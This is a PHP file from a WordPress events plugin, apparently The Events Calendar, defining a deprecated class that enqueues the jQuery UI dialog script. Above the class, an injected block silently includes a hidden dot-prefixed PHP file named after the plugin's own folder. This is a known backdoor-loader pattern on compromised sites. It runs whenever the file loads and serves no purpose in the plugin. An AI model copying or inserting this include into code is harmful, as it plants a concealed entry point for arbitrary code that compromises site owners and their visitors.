<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Dialog extends Tribe__Events__Asset__Abstract_Asset {

	public function handle() {
		wp_enqueue_script( 'jquery-ui-dialog' );
		Tribe__Events__Template_Factory::add_vendor_script( 'jquery-ui-dialog' );
	}
}
